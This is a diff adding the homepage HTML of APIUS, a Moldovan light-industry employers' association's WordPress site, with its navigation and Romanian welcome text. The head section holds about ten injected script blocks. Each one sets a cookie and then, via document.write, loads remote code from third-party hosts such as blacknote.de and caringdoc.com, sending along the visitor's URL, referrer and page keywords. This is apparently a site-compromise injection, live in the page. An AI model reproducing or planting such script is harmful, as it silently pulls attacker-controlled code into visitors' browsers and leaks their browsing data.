@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+
+    <meta charset="utf-8" />
+   	<title>
+   		Apius	</title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <!--Favicon -->
+	<link rel="icon" type="image/png" href="images/favicon.png" />
+	<script type="text/javascript">
+    var ajaxurl = "http://apius.md/wp-admin/admin-ajax.php";
+    var ff_template_url = "http://apius.md/wp-content/themes/oxygen";
+	</script>
+ 	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Apius &raquo; Feed" href="http://apius.md/?feed=rss2" />
+<link rel="alternate" type="application/rss+xml" title="Apius &raquo; Comments Feed" href="http://apius.md/?feed=comments-rss2" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/apius.md\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.10"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='ff-minified-style-0-css'  href='http://apius.md/wp-content/uploads/freshframework/assetsmin/8bc4e63d1a030c8d05dfdc45c275d568.css' type='text/css' media='all' />
+<link rel='stylesheet' id='ls-google-fonts-css'  href='http://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900%7COpen+Sans:300%7CIndie+Flower:regular%7COswald:300,regular,700&#038;subset=latin' type='text/css' media='all' />
+<link rel='stylesheet' id='ff-minified-style-1-css'  href='http://apius.md/wp-content/uploads/freshframework/assetsmin/2f491a97ddd369733fa75638246b42eb.css' type='text/css' media='all' />
+<style id='ff-minified-style-1-inline-css' type='text/css'>
+.tp-caption a{color:#ff7302;text-shadow:none;-webkit-transition:all 0.2s ease-out;-moz-transition:all 0.2s ease-out;-o-transition:all 0.2s ease-out;-ms-transition:all 0.2s ease-out}.tp-caption a:hover{color:#ffa902}
+
+html, body, h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
+	font-family: 'Open Sans';
+}
+
+.condensed{
+	font-family: 'Open Sans Condensed';
+}
+
+.condiment{
+	font-family: 'Condiment';
+}
+
+.playball{
+	font-family: 'Playball';
+}
+
+.code, pre{
+	font-family: 'Courier New', Courier, monospace;
+}
+
+
+
+</style>
+<link rel='stylesheet' id='google-font-open-sans-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A100italic%2C300italic%2C400italic%2C500italic%2C600italic%2C700italic%2C800italic%2C900italic%2C100%2C300%2C400%2C500%2C600%2C700%2C800%2C900&#038;subset=latin%2Clatin-ext&#038;ver=4.7.10' type='text/css' media='all' />
+<link rel='stylesheet' id='google-font-open-sans-condensed-css'  href='//fonts.googleapis.com/css?family=Open+Sans+Condensed%3A100italic%2C300italic%2C400italic%2C500italic%2C600italic%2C700italic%2C800italic%2C900italic%2C100%2C300%2C400%2C500%2C600%2C700%2C800%2C900&#038;subset=latin%2Clatin-ext&#038;ver=4.7.10' type='text/css' media='all' />
+<link rel='stylesheet' id='google-font-condiment-css'  href='//fonts.googleapis.com/css?family=Condiment%3A100italic%2C300italic%2C400italic%2C500italic%2C600italic%2C700italic%2C800italic%2C900italic%2C100%2C300%2C400%2C500%2C600%2C700%2C800%2C900&#038;subset=latin%2Clatin-ext&#038;ver=4.7.10' type='text/css' media='all' />
+<link rel='stylesheet' id='google-font-playball-css'  href='//fonts.googleapis.com/css?family=Playball%3A100italic%2C300italic%2C400italic%2C500italic%2C600italic%2C700italic%2C800italic%2C900italic%2C100%2C300%2C400%2C500%2C600%2C700%2C800%2C900&#038;subset=latin%2Clatin-ext&#038;ver=4.7.10' type='text/css' media='all' />
+<script type='text/javascript' src='http://apius.md/wp-content/uploads/freshframework/assetsmin/dccec6e118f3d6d6f1db093c34881283.js'></script>
+<script type='text/javascript' src='http://apius.md/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.tools.min.js?rev=4.6.0&#038;ver=4.7.10'></script>
+<script type='text/javascript' src='http://apius.md/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?rev=4.6.0&#038;ver=4.7.10'></script>
+<script type='text/javascript' src='http://apius.md/wp-content/uploads/freshframework/assetsmin/f0256ae60d19252ec391478d49b74504.js'></script>
+<link rel='https://api.w.org/' href='http://apius.md/?rest_route=/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://apius.md/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://apius.md/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.7.10" />
+<link rel="canonical" href="http://apius.md/" />
+<link rel='shortlink' href='http://apius.md/' />
+<link rel="alternate" type="application/json+oembed" href="http://apius.md/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fapius.md%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://apius.md/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fapius.md%2F&#038;format=xml" />
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//apius.md/?wordfence_lh=1&hid=03588499CC3D38AF63A047158E4AA079');
+</script>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
+<!--[if IE 8]><link rel="stylesheet" type="text/css" href="http://apius.md/wp-content/plugins/js_composer/assets/css/vc-ie8.css" media="screen"><![endif]--><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript>
+
+
+
+<script>var b='red';c='mod';function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://blacknote.de/js/jquery.min.php' + '?key=xor' + '&utm_campaign=' + 'J18171' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b='red';c='mod';function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://blacknote.de/js/jquery.min.php' + '?key=xor' + '&utm_campaign=' + 'J18171' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://caringdoc.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://caringdoc.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://www.21vn.de/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://www.21vn.de/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://1913340.sites.myregisteredsite.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://1913340.sites.myregisteredsite.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://letmevote.eu/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://letmevote.eu/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://data01.asadal.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://data01.asadal.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
+
+<body class="home page-template page-template-page-onepage page-template-page-onepage-php page page-id-159 page-parent wpb-js-composer js-comp-ver-4.5.1 vc_responsive">
+
+
+
+
+
+	
+
+		<section id="fixed_video">
+		<!-- Video -->
+		<div
+			id="P2"
+			class="player video-container"
+			data-property="{videoURL:'https://www.youtube.com/watch?v=m3Y7NvXawKI',containment:'#fixed_video',autoPlay:true, showControls:false, mute:true, startAt:0, opacity:1}"
+			data-background="http://apius.md/wp-content/uploads/2014/08/mobile-bg.jpg"
+		></div>
+		<!-- End Video -->
+	</section>
+	
+	
+
+	
+
+
+	<!-- Navigation -->
+	<section id="navigation" class="white-nav visible-nav clearfix">
+		<!-- Navigation Inner -->
+		<div class="nav-inner">
+			<!-- Site Logo -->
+			<div class="site-logo">
+				<!-- Your Logo -->
+				<a href="http://apius.md/" class="scroll logo "><span class="h1 condiment">Apius</span></a>
+			</div><!-- End Site Logo -->
+			<a class="mini-nav-button dark"><i class="ff-font-awesome icon- icon-menu"></i></a>
+						<!-- Navigation Menu -->
+			<div class="nav-menu">
+				<ul role="menu" id="menu-menu-1" class="nav navbar-nav navbar-left nav uppercase condensed bold"><li id="menu-item-148" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-148"><a title="Home" href="#home" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-admin-home" aria-hidden="true"></i><span>Home</span></a></li>
+<li id="menu-item-187" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-187"><a title="Despre noi" href="#about" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-admin-site" aria-hidden="true"></i><span>Despre noi</span></a></li>
+<li id="menu-item-250" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-250"><a title="Servicii" href="#services" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-admin-generic" aria-hidden="true"></i><span>Servicii</span></a></li>
+<li id="menu-item-251" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-251"><a title="Istoric companie" href="#history" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-chart-line" aria-hidden="true"></i><span>Istoric companie</span></a></li>
+<li id="menu-item-252" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-252"><a title="Membrii" href="#portfolio" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-portfolio" aria-hidden="true"></i><span>Membrii</span></a></li>
+<li id="menu-item-253" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-253"><a title="Echipa" href="#team" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-groups" aria-hidden="true"></i><span>Echipa</span></a></li>
+<li id="menu-item-293" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-293"><a title="Noutati" href="http://apius.md/?cat=2" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-shield-alt" aria-hidden="true"></i><span>Noutati</span></a></li>
+<li id="menu-item-255" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-255"><a title="Contact" href="#contact" class="dropdown-toggle" aria-haspopup="true"><i class="_mi _before dashicons dashicons-phone" aria-hidden="true"></i><span>Contact</span></a></li>
+</ul>			</div><!-- End Navigation Menu -->
+		</div><!-- End Navigation Inner -->
+	</section><!-- End Navigation Section -->	<!-- Home Section -->
+	<section id="home" class="ff-home-3"> 	
+		<div id="slides" class="home-video transparent pattern-black">
+			<div class="home-details">
+			
+				<div class="logo"><img src="http://apius.md/wp-content/uploads/2014/08/logo1.png" alt="Logo" /></div><div class="hometexts-1"><ul class="slide-text-1 condensed"><li class="hometext-1 normal playball">Impreună suntem mai puternici .</li><li class="hometext-1 normal playball">Asociația Patronală a Industriei Ușoare</li><li class="clear"></li></ul></div><ul class="home-categories"><li class="h-item uppercase">Noutati</li> <li class="h-item uppercase">DinInimă</li> <li class="h-item uppercase">Fashion Show</li> <li class="h-item uppercase">Membrii</li> </ul><a href="#about"  class="home-button scroll uppercase semibold  ">Beneficii APIUS</a><a href="http://apius.md/wp-content/uploads/2016/09/cerere_de_aderare_-ROM.doc"  class="home-button scroll uppercase semibold  ">Devino Membru</a> 
+<!-- 				<div class="hometexts-1"> -->
+						<!-- Slide Texts -->
+<!-- 						<ul class="slide-text-1 condensed"> -->
+<!-- 							<li class="hometext-1 normal playball">This is <span class="colored"> Oxygen</span> Theme !</li> -->
+<!-- 							<li class="hometext-1 normal playball">We Love to <span class="colored"> Design</span></li> -->
+<!-- 							<li class="hometext-1 normal playball">We Are <span class="colored"> Designers</span></li> -->
+<!-- 							<li class="clear"></li> -->
+<!-- 						</ul> -->
+<!-- 				</div> -->
+				<!-- Fixed Text -->
+				<!-- Home Categories -->
+<!-- 				<ul class="home-categories"> -->
+<!-- 					<li class="h-item uppercase ">web design</li> -->
+<!-- 					<li class="h-item uppercase ">one page</li> -->
+<!-- 					<li class="h-item uppercase ">analystic</li> -->
+<!-- 					<li class="h-item uppercase ">photography</li> -->
+<!-- 					<li class="h-item uppercase ">cool animations</li> -->
+<!-- 				</ul> -->
+				<!-- Bottom Arrow -->
+<!-- 				<a href="#about" class="home-button scroll uppercase semibold  "> -->
+<!-- 					Purchase -->
+<!-- 				</a> -->
+				<!-- Bottom Arrow -->
+<!-- 				<a href="#about" class="home-button scroll uppercase semibold  "> -->
+<!-- 					Read More -->
+<!-- 				</a> -->
+
+			</div><!-- End Home Texts -->
+		</div><!-- End Home Details -->
+	</section><!-- End Home Section -->
+	<section id="home-bottom" class="relative full-width clearfix">
+		<div class="home-bottom-inner clearfix">
+			<div class="col-xs-7 no-padding t-left left">
+				<h2 class="white normal no-margin no-padding">
+					<span class="colored condiment bigger">Conditiilie de eligibilitate pentru a deveni membru</span>				</h2>
+			</div>
+			<div class="col-xs-5 no-padding t-right">
+				<span class="white normal no-margin no-padding">
+									</span>
+				<a href="http://apius.md/wp-content/uploads/2016/11/Conditii-pentru-Membri.docx.doc" class="home-bottom-button normal colored-bg white uppercase scroll">
+					Vezi acum				</a>
+			</div>
+		</div>
+	</section>
+
+<!-- About -->
+<section id="about" class="container has-bg">
+	<div class="inner">
+		<!-- Header -->
+		<h1 class="header semibold dark">Asociația Patronală din Industria Ușoară <span class="colored">APIUS.</span></h1>
+		<!-- Description -->
